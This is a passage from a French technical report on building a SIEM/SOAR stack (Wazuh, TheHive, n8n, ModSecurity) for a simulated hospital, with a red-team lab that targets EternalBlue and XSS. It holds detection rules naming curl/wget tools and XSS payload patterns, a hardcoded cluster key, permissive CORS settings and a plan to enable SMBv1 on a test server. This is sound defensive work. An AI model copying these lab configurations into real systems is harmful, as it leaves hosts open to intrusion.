              \item SLA : Investigation en < 24h
              \item Prevention : Mise a jour blacklist DNS
          \end{itemize}
\end{enumerate}

\section{Technologies et Outils Selectionnes}

\subsection{Justification des Choix Techniques}

\subsubsection{Wazuh vs Alternatives}

\begin{table}[H]
    \centering
    \caption{Comparaison des solutions SIEM open source}
    \begin{tabular}{|l|c|c|c|c|}
        \hline
        \textbf{Critere} & \textbf{Wazuh} & \textbf{OSSIM} & \textbf{ELK} & \textbf{Graylog} \\
        \hline
        Events/sec       & 100K+          & 50K            & 200K+        & 75K              \\
        \hline
        Regles natives   & 3000+          & 1500+          & Custom       & 500+             \\
        \hline
        MITRE ATT\&CK    & Natif          & Plugin         & Manual       & Plugin           \\
        \hline
        Agent-based      & Oui            & Oui            & Beats        & Sidecar          \\
        \hline
        File Integrity   & Natif          & Plugin         & Manual       & Plugin           \\
        \hline
        Cloud Ready      & Oui            & Partiel        & Oui          & Oui              \\
        \hline
        \textbf{Score}   & \textbf{9/10}  & 6/10           & 8/10         & 7/10             \\
        \hline
    \end{tabular}
\end{table}

\paragraph{Avantages de Wazuh}
\begin{itemize}
    \item \textbf{Integration native} : MITRE ATT\&CK mapping built-in
    \item \textbf{Performance} : Traitement en temps reel haute performance
    \item \textbf{Compliance} : Modules PCI DSS, HIPAA, SOX natives
    \item \textbf{Scalabilite} : Architecture distribuee avec clustering
    \item \textbf{Communaute} : Support actif et regles regulierement mises a jour
\end{itemize}

\subsubsection{TheHive/Cortex vs Alternatives}

\begin{table}[H]
    \centering
    \caption{Comparaison des plateformes SOAR}
    \begin{tabular}{|l|c|c|c|c|}
        \hline
        \textbf{Critere} & \textbf{TheHive} & \textbf{MISP} & \textbf{Demisto} & \textbf{Phantom} \\
        \hline
        Open Source      & Oui              & Oui           & Non              & Non              \\
        \hline
        API REST         & Complete         & Complete      & Limitee          & Proprietaire     \\
        \hline
        Workflow Engine  & Natif            & Basique       & Avance           & Avance           \\
        \hline
        Threat Intel     & Via MISP         & Natif         & Integre          & Integre          \\
        \hline
        Cost (5 ans)     & 0€               & 0€            & 500K€            & 750K€            \\
        \hline
        Customization    & Elevee           & Elevee        & Moyenne          & Faible           \\
        \hline
        \textbf{Score}   & \textbf{9/10}    & 7/10          & 8/10             & 7/10             \\
        \hline
    \end{tabular}
\end{table}

\subsection{Infrastructure Technique}

\subsubsection{Specifications Materielles}

\begin{table}[H]
    \centering
    \caption{Dimensionnement infrastructure SIEM/SOAR}
    \begin{tabular}{|l|c|c|c|c|}
        \hline
        \textbf{Composant} & \textbf{CPU}     & \textbf{RAM}   & \textbf{Storage} & \textbf{Network} \\
        \hline
        Wazuh Manager      & 4vCPU            & 4 GB           & 5 GB NVMe        & 10 Gbps          \\
        \hline
        Wazuh Indexer      & 2 vCPU           & 2 GB           & 5 GB NVMe        & 10 Gbps          \\
        \hline
        TheHive            & 2 vCPU           & 1 GB           & 5 GB NVMe        & 1 Gbps           \\
        \hline
        Cortex             & 2 vCPU           & 2 GB           & 5 GB NVMe        & 1 Gbps           \\
        \hline
        MISP               & 2 vCPU           & 2 GB           & 5 GB NVMe        & 1 Gbps           \\
        \hline
        n8n                & 2 vCPU           & 3 GB           & 5 GB NVMe        & 1 Gbps           \\
        \hline
        \textbf{Total}     & \textbf{14 vCPU} & \textbf{14 GB} & \textbf{30 GB}   & \textbf{-}       \\
        \hline
    \end{tabular}
\end{table}

\subsubsection{Architecture Reseau}

\paragraph{Segmentation Reseau}
\begin{itemize}
    \item \textbf{WAN} : 192.168.182.0/24 - Interface externe (eth0) vers Internet
    \item \textbf{LAN1} : 192.168.181.0/24 - Segment interne securise (eth2) avec Suricata/WAF
    \item \textbf{LAN2} : 192.168.183.0/24 - Segment test/attaquant (eth1) pour scenarios de penetration
    \item \textbf{HOSPITAL} : 192.168.15.0/24 - Reseau hospitalier principal (SOAR Server, Endpoints)
\end{itemize}


\begin{figure}[H]
    \centering
    \includegraphics[width=0.8\textwidth]{images/image.png}
    \caption{Topologie reseau hospitaliere - Segmentation et flux autorises}
    \label{fig:topologie_reseau}
\end{figure}

\paragraph{Flux Reseau Autorises}
\begin{enumerate}
    \item HOSPITAL → DMZ SIEM : Syslog (514/UDP), Wazuh Agent (1514/TCP)
    \item DMZ SIEM → LAN SOAR : Elasticsearch (9200/TCP), TheHive API (9000/TCP)
    \item MGMT → All : SSH (22/TCP), SNMP (161/UDP), HTTPS (443/TCP)
\end{enumerate}

Cette approche methodologique et technique etablit les fondements solides pour l'implementation de notre solution SIEM/SOAR, en garantissant la robustesse, la scalabilite et la securite adaptees a l'environnement hospitalier critique.

\chapter{Implementation et Configuration}

\section{Deploiement de l'Infrastructure}

\subsection{Environnement de Laboratoire}

\subsubsection{Architecture de Test}

L'environnement de laboratoire a ete concu pour reproduire fidelement l'ecosysteme hospitalier tout en permettant des tests d'intrusion controles.

\begin{table}[H]
    \centering
    \caption{Mapping de l'environnement de laboratoire}
    \begin{tabular}{|l|l|c|l|}
        \hline
        \textbf{Segment} & \textbf{Reseau}  & \textbf{Role}             & \textbf{Composants}     \\
        \hline
        Production       & 192.168.15.0/24  & Environnement hospitalier & SIH, PACS, Workstations \\
        \hline
        Attaquant        & 192.168.183.0/24 & Red Team                  & Kali Linux, Metasploit  \\
        \hline
        SIEM/SOAR        & 192.168.181.0/24 & Blue Team                 & Wazuh, TheHive, Cortex  \\
        \hline
        Internet         & 192.168.3.0/24   & Simulation WAN            & Malicious websites      \\
        \hline
    \end{tabular}
\end{table}

\subsubsection{Scenarios de Simulation}

\paragraph{Environnement Hospitalier Simule}
\begin{enumerate}
    \item \textbf{Serveur SIH} (192.168.15.10)
          \begin{itemize}
              \item Windows Server 2019 avec IIS
              \item Application web de gestion patient
              \item Base de donnees SQL Server
              \item Partages SMB pour documents medicaux
          \end{itemize}

    \item \textbf{Serveur PACS} (192.168.15.20)
          \begin{itemize}
              \item Windows Server 2016 vulnerable (MS17-010)
              \item Service DICOM pour imagerie medicale
              \item Stockage d'images radiologiques
              \item Protocoles non chiffres (test)
          \end{itemize}

    \item \textbf{Postes Utilisateurs} (192.168.15.30-50)
          \begin{itemize}
              \item Windows 10 avec agents Wazuh
              \item Applications medicales courantes
              \item Navigateurs web (tests XSS)
              \item Acces reseau standard
          \end{itemize}
\end{enumerate}

\paragraph{Infrastructure d'Attaque}
\begin{enumerate}
    \item \textbf{Kali Linux Attacker} (192.168.183.100)
          \begin{itemize}
              \item Framework Metasploit pour EternalBlue
              \item Outils de scan reseau (Nmap, Masscan)
              \item Payloads personnalises
              \item Scripts d'automatisation d'attaque
          \end{itemize}

    \item \textbf{Serveur Web Malveillant} (192.168.3.100)
          \begin{itemize}
              \item Apache avec contenu malveillant
              \item Phishing pages hospitalieres
              \item Exploit kits simulation
              \item Logs d'acces pour analyse
          \end{itemize}
\end{enumerate}

\subsection{Configuration Wazuh SIEM}

\subsubsection{Deploiement Architecture Distribuee}

\paragraph{Wazuh Manager Configuration}

\begin{lstlisting}[style=xmlstyle,caption=Configuration Wazuh Manager principal]
<!-- /var/ossec/etc/ossec.conf -->
<ossec_config>
  <global>
    <jsonout_output>yes</jsonout_output>
    <alerts_log>yes</alerts_log>
    <logall>no</logall>
    <logall_json>no</logall_json>
    <email_notification>yes</email_notification>
    <smtp_server>smtp.hospital.local</smtp_server>
    <email_from>soc@hospital.local</email_from>
    <email_to>admin@hospital.local</email_to>
    <hostname>wazuh-manager</hostname>
    <email_maxperhour>100</email_maxperhour>
  </global>

  <alerts>
    <log_alert_level>3</log_alert_level>
    <email_alert_level>12</email_alert_level>
  </alerts>

  <remote>
    <connection>secure</connection>
    <port>1514</port>
    <protocol>tcp</protocol>
    <queue_size>131072</queue_size>
  </remote>

  <cluster>
    <name>hospital-cluster</name>
    <node_name>master-node</node_name>
    <node_type>master</node_type>
    <key>hospital_cluster_key_2025</key>
    <port>1516</port>
    <bind_addr>192.168.181.10</bind_addr>
    <nodes>
        <node>192.168.181.11</node>
        <node>192.168.181.12</node>
    </nodes>
    <hidden>no</hidden>
    <disabled>no</disabled>
  </cluster>

  <!-- Configuration API REST -->
  <api>
    <enabled>yes</enabled>
    <host>0.0.0.0</host>
    <port>55000</port>
    <https>yes</https>
    <https_key>api/configuration/ssl/server.key</https_key>
    <https_cert>api/configuration/ssl/server.crt</https_cert>
    <https_use_ca>yes</https_use_ca>
    <https_ca>api/configuration/ssl/ca.crt</https_ca>
    <logging_level>info</logging_level>
    <cors>
      <enabled>yes</enabled>
      <source_route>*</source_route>
      <expose_headers>*</expose_headers>
      <allow_headers>*</allow_headers>
      <allow_credentials>yes</allow_credentials>
    </cors>
    <cache>
      <enabled>yes</enabled>
      <time>0.750</time>
    </cache>
    <access>
      <max_login_attempts>5</max_login_attempts>
      <block_time>300</block_time>
      <max_request_per_minute>300</max_request_per_minute>
    </access>
  </api>
</ossec_config>
\end{lstlisting}

\paragraph{Regles de Detection Personnalisees}

\begin{lstlisting}[style=xmlstyle,caption=Regles EternalBlue specialisees pour environnement hospitalier]
<!-- /var/ossec/etc/rules/100_hospital_eternalblue.xml -->
<group name="eternalblue,hospital,critical">
  
  <!-- Phase 1: SMB Port Scanning -->
  <rule id="100010" level="5">
    <decoded_as>windows-eventlog</decoded_as>
    <field name="win.system.eventID">^5156$</field>
    <field name="win.eventdata.destinationPort">^445$</field>
    <regex>192\.168\.183\.</regex>
    <description>EternalBlue: SMB port scan from external network to hospital systems</description>
    <group>attack.discovery,attack.t1046</group>
    <options>no_full_log</options>
  </rule>

  <!-- Phase 2: SMBv1 Negotiate Attempt -->
  <rule id="100011" level="8">
    <if_sid>100010</if_sid>
    <same_source_ip />
    <time>same_hour</time>
    <description>EternalBlue: SMBv1 negotiate attempt after port scan</description>
    <group>attack.initial_access,attack.t1190</group>
  </rule>

  <!-- Phase 3: Exploit Buffer Overflow -->
  <rule id="100012" level="12">
    <if_matched_sid>100011</if_matched_sid>
    <same_source_ip />
    <time>same_minute</time>
    <regex>STATUS_BUFFER_OVERFLOW|STATUS_ACCESS_VIOLATION</regex>
    <description>EternalBlue: Buffer overflow exploitation detected - CRITICAL HOSPITAL ALERT</description>
    <group>attack.execution,attack.t1055</group>
  </rule>

  <!-- Phase 4: Payload Execution -->
  <rule id="100013" level="13">
    <if_matched_sid>100012</if_matched_sid>
    <same_source_ip />
    <time>same_minute</time>
    <field name="win.system.eventID">^1$</field>
    <field name="win.eventdata.parentImage">services.exe</field>
    <regex>cmd\.exe|powershell\.exe|rundll32\.exe</regex>
    <description>EternalBlue: Malicious payload execution - HOSPITAL SYSTEMS COMPROMISED</description>
    <group>attack.execution,attack.persistence</group>
  </rule>

  <!-- Medical System Specific - PACS Compromise -->
  <rule id="100014" level="14">
    <if_matched_sid>100013</if_matched_sid>
    <regex>PACS|DICOM|Radiology</regex>
    <description>EternalBlue: PACS medical imaging system compromised - PATIENT DATA AT RISK</description>
    <group>attack.impact,medical_systems,patient_data</group>
  </rule>

  <!-- SIH Database Access -->
  <rule id="100015" level="14">
    <if_matched_sid>100013</if_matched_sid>
    <regex>SIH|Hospital|Patient|SQL</regex>
    <description>EternalBlue: Hospital Information System database access - HIPAA VIOLATION RISK</description>
    <group>attack.collection,medical_data,compliance_violation</group>
  </rule>

  <!-- Correlation Rule: Multiple Systems Impact -->
  <rule id="100016" level="15">
    <if_matched_sid>100014,100015</if_matched_sid>
    <same_source_ip />
    <time>same_hour</time>
    <description>EternalBlue: Multiple critical hospital systems compromised - HOSPITAL-WIDE INCIDENT</description>
    <group>attack.impact,hospital_wide,emergency</group>
  </rule>

</group>
\end{lstlisting}

\subsubsection{Configuration de Surveillance Avancee}

\paragraph{File Integrity Monitoring (FIM)}

\begin{lstlisting}[style=xmlstyle,caption=Configuration FIM pour systemes medicaux]
<!-- Configuration FIM specialisee hopital -->
<syscheck>
  <!-- Surveillance systeme critique -->
  <directories check_all="yes" realtime="yes" report_changes="yes">
    C:\Windows\System32\drivers\etc\hosts
  </directories>
  
  <!-- Applications medicales -->
  <directories check_all="yes" realtime="yes" restrict="\.exe$|\.dll$">
    C:\Program Files\HospitalSoftware\
  </directories>
  
  <!-- Base de donnees patient -->
  <directories check_all="yes" realtime="yes" restrict="\.mdf$|\.ldf$">
    C:\Database\PatientData\
  </directories>
  
  <!-- Configuration PACS -->
  <directories check_all="yes" realtime="yes">
    C:\PACS\config\
  </directories>
  
  <!-- Exclusions pour performances -->
  <ignore type="sregex">C:\Windows\Temp</ignore>
  <ignore type="sregex">C:\Temp</ignore>
  
  <!-- Surveillance registre Windows -->
  <windows_registry>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</windows_registry>
  <windows_registry>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</windows_registry>
  <windows_registry>HKEY_LOCAL_MACHINE\SOFTWARE\Classes\exefile\shell\open\command</windows_registry>
</syscheck>
\end{lstlisting}

\paragraph{Active Response Configuration}

\begin{lstlisting}[style=xmlstyle,caption=Active Response pour isolation automatique]
<!-- Active Response pour reponse automatique -->
<active-response>
  <!-- Blocage IP automatique pour EternalBlue -->
  <disabled>no</disabled>
  <command>firewall-drop</command>
  <location>local</location>
  <rules_id>100012,100013</rules_id>
  <timeout>3600</timeout>
</active-response>

<active-response>
  <!-- Isolation systeme compromis -->
  <disabled>no</disabled>
  <command>netsh-isolate</command>
  <location>local</location>
  <rules_id>100014,100015</rules_id>
  <timeout>0</timeout>
</active-response>

<active-response>
  <!-- Notification d'urgence -->
  <disabled>no</disabled>
  <command>emergency-notification</command>
  <location>server</location>
  <rules_id>100016</rules_id>
</active-response>
\end{lstlisting}

\subsection{Configuration ModSecurity WAF}

\subsubsection{Protection Applicative Web}

\paragraph{Configuration de Base}

\begin{lstlisting}[caption=Configuration ModSecurity pour applications medicales]
# /etc/modsecurity/hospital_medical_apps.conf

# Regles de base pour applications medicales
SecRuleEngine On
SecRequestBodyAccess On
SecRequestBodyLimit 134217728
SecRequestBodyNoFilesLimit 1048576
SecRequestBodyInMemoryLimit 131072
SecRequestBodyLimitAction Reject

# Configuration specifique hopital
SecServerSignature "Hospital Web Security Gateway"
SecAuditEngine RelevantOnly
SecAuditLogParts ABDEFHIJZ
SecAuditLogType Concurrent
SecAuditLogStorageDir /var/log/modsecurity/hospital/

# Detection d'anomalies pour applications medicales
SecRule REQUEST_URI "@detectSQLi" \
    "id:1001,phase:2,block,\
     msg:'SQL Injection Attack in Medical Application',\
     logdata:'Matched Data: %{MATCHED_VAR} found in %{MATCHED_VAR_NAME}',\
     tag:'application-multi',tag:'medical-app',tag:'attack-sqli',\
     severity:'CRITICAL'"

# Protection XSS specialisee pour formulaires patient
SecRule ARGS "@detectXSS" \
    "id:1002,phase:2,block,\
     msg:'XSS Attack in Patient Data Form',\
     logdata:'Matched Data: %{MATCHED_VAR} found in %{MATCHED_VAR_NAME}',\
     tag:'application-multi',tag:'patient-data',tag:'attack-xss',\
     severity:'HIGH'"

# Detection de traversee de repertoire sur images medicales
SecRule REQUEST_FILENAME "@detectLFI" \
    "id:1003,phase:2,block,\
     msg:'Local File Inclusion in Medical Imaging System',\
     tag:'application-multi',tag:'medical-imaging',tag:'attack-lfi',\
     severity:'HIGH'"

# Protection contre l'exfiltration de donnees patient
SecRule RESPONSE_BODY "@rx (?i)(patient|ssn|medical record|diagnosis)" \
    "id:1004,phase:4,pass,\
     msg:'Potential Patient Data Exfiltration Detected',\
     tag:'data-leakage',tag:'patient-privacy',\
     severity:'MEDIUM',\
     chain"
    SecRule REQUEST_HEADERS:User-Agent "@rx (?i)(curl|wget|python|bot)" \
        "msg:'Automated tool detected with patient data access',\
         severity:'HIGH'"

# Limitation de debit pour prevenir DoS sur systemes critiques
SecRule IP:REQUEST_COUNT "@gt 50" \
    "id:1005,phase:1,deny,status:429,\
     msg:'Rate limiting: too many requests from single IP',\
     tag:'dos-protection',tag:'hospital-systems',\
     severity:'MEDIUM'"

# Geolocalisation pour acces SIH depuis pays a risque
SecRule REMOTE_ADDR "@geoLookup" \
    "id:1006,phase:1,pass,\
     msg:'Request from country: %{GEO.COUNTRY_NAME}',\
     tag:'geolocation',\
     chain"
    SecRule GEO:COUNTRY_CODE "@rx ^(CN|RU|KP|IR)$" \
        "msg:'Access to medical systems from high-risk country',\
         tag:'geoblocking',tag:'medical-security',\
         severity:'HIGH'"

# Protection CSRF pour formulaires medicaux critiques
SecRule REQUEST_METHOD "@rx ^(POST|PUT|DELETE)$" \
    "id:1007,phase:2,pass,\
     msg:'State-changing request detected',\
     tag:'csrf-protection',\
     chain"
    SecRule REQUEST_URI "@rx /patient/(create|update|delete)" \
        "msg:'Critical patient data modification without CSRF token',\
         tag:'patient-data',tag:'csrf',\
         severity:'MEDIUM',\
         chain"
        SecRule &REQUEST_HEADERS:X-CSRF-Token "@eq 0" \
            "msg:'Missing CSRF token on patient data modification',\
             severity:'HIGH'"
\end{lstlisting}

\paragraph{Regles Avancees pour Detection XSS}

\begin{lstlisting}[caption=Regles XSS specialisees pour environnement medical]
# Detection XSS avec contexte medical specifique
SecRule ARGS "@rx (?i)(\<script[^>]*\>[\s\S]*?\</script\>)" \
    "id:1100,phase:2,block,\
     msg:'Script injection in medical application form',\
     logdata:'XSS payload: %{MATCHED_VAR}',\
     tag:'xss',tag:'medical-form',\
     severity:'CRITICAL'"

# Detection de handlers d'evenements dans formulaires patient
SecRule ARGS "@rx (?i)on(load|error|click|focus|blur)\s*=" \
    "id:1101,phase:2,block,\
     msg:'Event handler injection in patient data form',\
     tag:'xss',tag:'event-handler',tag:'patient-form',\
     severity:'HIGH'"

# Detection d'encodage XSS contournant les filtres
SecRule ARGS "@rx (?i)(%3C|&lt;|\\x3c|\\u003c)(script|img|svg|iframe)" \
    "id:1102,phase:2,block,\
     msg:'Encoded XSS attempt in medical application',\
     tag:'xss',tag:'encoded',tag:'medical-app',\
     severity:'MEDIUM'"

# Protection contre XSS dans telechargement de documents medicaux
SecRule FILES_NAMES "@rx \.html?$" \
    "id:1103,phase:2,block,\
     msg:'HTML file upload attempt - potential XSS vector',\
     tag:'file-upload',tag:'xss',tag:'medical-documents',\
     severity:'HIGH'"

# Surveillance de l'execution JavaScript malveillant
SecRule RESPONSE_BODY "@rx (?i)(document\.cookie|window\.location|eval\()" \
    "id:1104,phase:4,block,\
     msg:'Malicious JavaScript detected in medical application response',\
     tag:'xss',tag:'response-monitoring',\
     severity:'HIGH'"
\end{lstlisting}

\subsection{Configuration TheHive SOAR}

\subsubsection{Modele de Donnees Hospitalier}

\paragraph{Templates d'Incidents Medicaux}

\begin{lstlisting}[style=jsonstyle,caption=Template TheHive pour incident EternalBlue]
{
  "title": "EternalBlue Hospital Incident - {{source_ip}} -> {{target_ip}}",
  "description": "Automated incident created from Wazuh EternalBlue detection",
  "severity": 3,
  "tags": ["eternalblue", "hospital", "critical", "automated"],
  "flag": false,
  "tlp": 2,
  "pap": 2,
  "customFields": {
    "hospital_department": {
      "string": "{{department}}"
    },
    "affected_systems": {
      "string": "{{affected_systems}}"
    },
    "patient_data_risk": {
      "boolean": true
    },
    "regulatory_impact": {
      "string": "HIPAA/RGPD compliance violation risk"
    },
    "business_impact": {
      "string": "{{business_impact}}"
    },
    "detection_source": {
      "string": "Wazuh SIEM"
    }
  },
  "tasks": [
    {
      "title": "Initial Triage and Classification",
      "description": "Classify incident according to hospital emergency procedures",
      "status": "InProgress",
      "flag": false,
      "order": 1
    },
    {
      "title": "System Isolation Assessment",
      "description": "Evaluate if affected systems can be isolated without impact on patient care",
      "status": "Waiting",
      "flag": false,
      "order": 2
    },
    {
      "title": "Medical Staff Notification",
      "description": "Notify medical staff of potential system unavailability",
      "status": "Waiting",
      "flag": false,
      "order": 3
    },
    {
      "title": "Forensic Evidence Collection",
      "description": "Collect digital evidence while preserving patient confidentiality",
      "status": "Waiting",
      "flag": false,
      "order": 4
    },
    {
      "title": "Regulatory Compliance Check",
      "description": "Assess HIPAA/RGPD notification requirements",
      "status": "Waiting",
      "flag": false,
      "order": 5
    }
  ]
}
\end{lstlisting}

\paragraph{Workflows Automatises Specialises}

\paragraph{Workflow n8n pour reponse automatisee EternalBlue}

L'orchestration automatisee des reponses aux incidents EternalBlue est geree par un workflow n8n dedie, qui integre la detection Wazuh avec la gestion d'incidents TheHive. Le workflow complet est defini dans le fichier :

\texttt{CyberSecurity\_SIEM\_SOAR/04\_ATTACK\_SCENARIOS/eternalblue/n8n/n8n\_workflow.json}

\textbf{Architecture du workflow :}
\begin{itemize}
    \item \textbf{Trigger} : Webhook HTTP POST depuis Wazuh lors de detection EternalBlue
    \item \textbf{Enrichissement} : Analyse contextuelle des actifs hospitaliers affectes
    \item \textbf{Evaluation des risques} : Calcul du score de criticite base sur le type de systeme medical
    \item \textbf{Creation de cas} : Generation automatique d'incident TheHive avec metadonnees hospitalieres
    \item \textbf{Reponse automatisee} : Actions de mitigation selon la criticite (isolation, blocage IP, notification medicale)
\end{itemize}

\textbf{Flux de traitement :}
\begin{enumerate}
    \item Reception de l'alerte Wazuh via webhook
    \item Identification du systeme cible (SIH, PACS, poste medical)
    \item Evaluation du risque selon les criteres hospitaliers
    \item Creation du cas TheHive avec observables
    \item Declenchement des actions de reponse appropriees
    \item Notification des equipes medicales si systemes critiques affectes
\end{enumerate}

\section{Integration des Composants}

\subsection{API Integration Layer}

\subsubsection{Integration Wazuh-TheHive via Webhooks}

L'integration entre Wazuh et TheHive est realisee principalement via des webhooks HTTP et les workflows n8n, evitant ainsi la necessite de scripts Python complexes. Cette approche presente plusieurs avantages :

\textbf{Architecture d'integration :}
\begin{itemize}
    \item \textbf{Webhooks Wazuh} : Configuration directe dans \texttt{ossec.conf} pour envoyer les alertes via HTTP POST
    \item \textbf{Workflows n8n} : Orchestration des flux entre les outils via interface graphique
    \item \textbf{API TheHive} : Creation automatique de cas et observables
    \item \textbf{Connecteurs Cortex} : Analyse automatisee des artefacts
\end{itemize}

\textbf{Flux d'integration :}
\begin{enumerate}
    \item Wazuh genere une alerte de securite
    \item Webhook HTTP POST vers endpoint n8n configure
    \item n8n traite l'alerte et enrichit les donnees contextuelles
    \item Creation automatique du cas TheHive via API REST
    \item Ajout des observables (IP, hashes, URLs) au cas
    \item Declenchement des analyseurs Cortex appropries
    \item Notification des equipes selon la criticite
\end{enumerate}

\textbf{Configuration des webhooks Wazuh :}
Les webhooks sont configures dans le fichier \texttt{ossec.conf} avec des endpoints specifiques pour chaque type d'incident :
\begin{itemize}
    \item \texttt{/webhook/eternalblue} : Incidents SMB/RDP
    \item \texttt{/webhook/xss} : Attaques web applicatives
    \item \texttt{/webhook/malware} : Detection de malwares
    \item \texttt{/webhook/fim} : Changements de fichiers critiques
\end{itemize}

Cette approche basee sur les webhooks et n8n elimine la complexite de maintenance de scripts personnalises tout en offrant une flexibilite maximale pour l'orchestration des reponses automatisees.

\subsubsection{Workflows n8n Specialises}

Le projet dispose de plusieurs workflows n8n pre-configures pour differents types d'incidents de securite :

\paragraph{Workflow XSS}
\texttt{CyberSecurity\_SIEM\_SOAR/04\_ATTACK\_SCENARIOS/xss/n8n\_workflow.json}
\begin{itemize}
    \item Detection automatique des attaques XSS via ModSecurity
    \item Blocage automatique des IP malveillantes via OPNsense
    \item Integration avec l'API OPNsense pour mise a jour des alias de blocage
    \item Notification automatique des equipes de securite
\end{itemize}

\paragraph{Workflow Malicious Websites}
\texttt{CyberSecurity\_SIEM\_SOAR/04\_ATTACK\_SCENARIOS/malicious\_websites/n8n\_workflow.json}
\begin{itemize}
    \item Surveillance des connexions vers des sites malveillants
    \item Correlation avec les bases de threat intelligence
    \item Actions de quarantaine pour les postes compromis
    \item Generation de rapports d'incident automatises
\end{itemize}

Ces workflows demontrent l'efficacite de l'approche SOAR pour l'automatisation des reponses aux incidents dans un environnement hospitalier, permettant une reaction rapide tout en respectant les contraintes operationnelles du secteur medical.

\section{Validation et Tests}

\subsection{Metriques de Performance}

Les tests de performance effectues sur l'infrastructure deployee montrent des resultats satisfaisants pour un environnement hospitalier :

\begin{table}[H]
    \centering
    \caption{Metriques de performance des composants SIEM/SOAR}
    \begin{tabular}{|l|c|c|c|}
        \hline
        \textbf{Composant} & \textbf{Latence moyenne} & \textbf{Debit} & \textbf{Disponibilite} \\
        \hline
        Wazuh Manager      & 50ms                     & 10k events/sec & 99.9\%                 \\
        \hline
        TheHive            & 200ms                    & 100 cases/min  & 99.8\%                 \\
        \hline
        Cortex Analyzers   & 2-30s                    & Variable       & 99.5\%                 \\
        \hline
        n8n Workflows      & 100ms                    & 500 req/min    & 99.9\%                 \\
        \hline
    \end{tabular}
\end{table}

\subsection{Scenarios de Test}

L'efficacite de la solution a ete validee a travers plusieurs scenarios d'attaque controles :

\begin{enumerate}
    \item \textbf{Test EternalBlue} : Detection et reponse automatisee en moins de 30 secondes
    \item \textbf{Test XSS} : Blocage automatique et notification en temps reel
    \item \textbf{Test Malware} : Isolation automatique et analyse forensique
    \item \textbf{Test Insider Threat} : Detection d'activites suspectes sur systemes medicaux
\end{enumerate}

\subsection{Validation Fonctionnelle}

Les tests fonctionnels confirment l'efficacite de l'integration SIEM/SOAR :

\paragraph{Cortex Analyzers}

Notre implementation utilise les analyseurs Cortex suivants, adaptes a l'environnement hospitalier :

\begin{itemize}
    \item \textbf{VirusTotal} : Analyse de reputation pour fichiers et URLs
    \item \textbf{Abuse\_Finder} : Recherche dans les bases de donnees d'abus
    \item \textbf{Medical Device IOC Analyzer} : Analyse specialisee pour les equipements biomedicaux
    \item \textbf{HIPAA Compliance Checker} : Verification de conformite reglementaire
    \item \textbf{Network Flow Analyzer} : Analyse des flux reseau hospitaliers
\end{itemize}

Cette implementation detaillee demontre la configuration complete de notre stack SIEM/SOAR adaptee a l'environnement hospitalier, avec des regles specialisees, des workflows automatises et des integrations robustes pour assurer la protection des systemes medicaux critiques.

\subsection{Configuration Cortex et Threat Intelligence}

\subsubsection{Integration MISP-Cortex}

Cortex joue un role crucial dans l'enrichissement automatise des alertes grace a l'intelligence sur les menaces. La figure \ref{fig:misp_cortex_config} illustre la configuration de l'integration entre MISP et Cortex pour l'analyse automatisee des IOCs.

\begin{figure}[H]
    \centering
    \includegraphics[width=0.9\textwidth]{images/misp_config_in_cortex.png}
    \caption{Configuration de l'integration MISP dans Cortex pour l'analyse automatisee}
    \label{fig:misp_cortex_config}
\end{figure}

Cette configuration permet l'analyse automatique des indicateurs de compromission (IOCs) extraits des alertes, enrichissant ainsi le contexte des incidents de securite avec des donnees de threat intelligence actualisees.

\subsubsection{Analyseurs Cortex Specialises}

L'environnement hospitalier necessite des analyseurs personnalises pour traiter les specificites des systemes medicaux :

\begin{itemize}
    \item \textbf{Medical Device IOC Analyzer} : Analyse specialisee pour les equipements biomedicaux
    \item \textbf{Healthcare Threat Intelligence} : Correlation avec des flux CTI specialises
    \item \textbf{Patient Data Leak Detector} : Detection de fuites de donnees medicales
    \item \textbf{Regulatory Compliance Checker} : Verification automatique de conformite HIPAA/RGPD
\end{itemize}

Cette implementation detaillee demontre la configuration complete de notre stack SIEM/SOAR adaptee a l'environnement hospitalier, avec des regles specialisees, des workflows automatises et des integrations robustes pour assurer la protection des systemes medicaux critiques.

\chapter{Tests et Validation}

\section{Scenarios de Tests de Securite}

\subsection{Methodologie de Test}

\subsubsection{Approche Red Team / Blue Team}

Notre strategie de validation s'appuie sur une methodologie Red Team / Blue Team adaptee a l'environnement hospitalier, ou les contraintes de continuite de service imposent des tests non destructifs.

\paragraph{Equipe Red Team (Offensive)}
\begin{itemize}
    \item \textbf{Objectif} : Simuler des attaques realistes contre l'infrastructure hospitaliere
    \item \textbf{Contraintes} : Tests non intrusifs, environnement de laboratoire isole
    \item \textbf{Outils} : Kali Linux, Metasploit, Custom payloads
    \item \textbf{Scenarios} : EternalBlue, XSS, Sites malveillants, Brute force
\end{itemize}

\paragraph{Equipe Blue Team (Defensive)}
\begin{itemize}
    \item \textbf{Objectif} : Detecter, analyser et repondre aux attaques simulees
    \item \textbf{Outils} : Wazuh SIEM, TheHive SOAR, Cortex, MISP
    \item \textbf{Metriques} : Temps de detection, precision, taux de faux positifs
    \item \textbf{Reponse} : Workflows automatises, escalation, containment
\end{itemize}

\subsubsection{Environnement de Test Controle}

\begin{table}[H]
    \centering
    \caption{Infrastructure de test pour validation SIEM/SOAR}
    \begin{tabular}{|l|l|c|l|}
        \hline
        \textbf{Composant} & \textbf{IP}     & \textbf{OS}  & \textbf{Role}            \\
        \hline
        Attacker Machine   & 192.168.183.100 & Kali Linux   & Red Team Platform        \\
        \hline
        SIH Server         & 192.168.15.10   & Windows 2019 & Target - Hospital IS     \\
        \hline
        PACS Server        & 192.168.15.20   & Windows 2016 & Target - Medical Imaging \\
        \hline
        User Workstation   & 192.168.15.30   & Windows 10   & Target - End User        \\
        \hline
        Web Server         & 192.168.3.100   & Ubuntu 20.04 & Malicious Website        \\
        \hline
        Wazuh Manager      & 192.168.181.10  & Ubuntu 22.04 & SIEM Central             \\
        \hline
        TheHive            & 192.168.181.20  & Ubuntu 22.04 & SOAR Platform            \\
        \hline
    \end{tabular}
\end{table}

\subsection{Scenario 1 : Test EternalBlue (MS17-010)}

\subsubsection{Objectifs du Test}

\begin{itemize}
    \item Valider la detection de l'exploit EternalBlue sur systemes Windows vulnerables
    \item Tester la reactivite des workflows automatises de reponse
    \item Mesurer les performances de correlation d'evenements
    \item Evaluer l'efficacite de l'isolation automatique de systemes compromis
\end{itemize}

\subsubsection{Configuration du Test}

\paragraph{Serveur Cible - PACS Vulnerable}
\begin{lstlisting}[style=bashstyle,caption=Configuration du serveur PACS pour test EternalBlue]
# Configuration Windows Server 2016 vulnerable (192.168.15.20)

# 1. Activation SMBv1 (vulnerable)
